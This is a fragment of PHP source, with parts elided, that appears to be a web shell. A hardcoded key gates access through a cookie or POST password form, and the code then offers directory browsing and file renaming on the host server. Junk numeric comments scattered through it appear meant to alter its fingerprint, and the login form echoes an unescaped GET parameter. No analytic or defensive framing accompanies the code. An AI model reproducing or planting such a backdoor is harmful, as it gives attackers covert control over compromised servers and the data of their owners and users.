...
$auth_key = "33b4dd6306fd6224a9e2dd1e69d3c1c9";
...
$pass = false;
if (isset($_COOKIE['pw_name_65568'])) {
    if(($_COOKIE['pw_name_65568']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_65568'])) {
        if(($_POST['pw_name_65568']) == $auth_key) {
            setcookie("pw_name_65568", $_POST['pw_name_65568']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_65568' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774334634 1724682774476834 1724682774978007 1724682774150573
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774334634 1724682774476834 1724682774978007 1724682774150573
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774334634 1724682774476834 1724682774978007 1724682774150573
            $name = PATH . "/" . $_GET['r'];
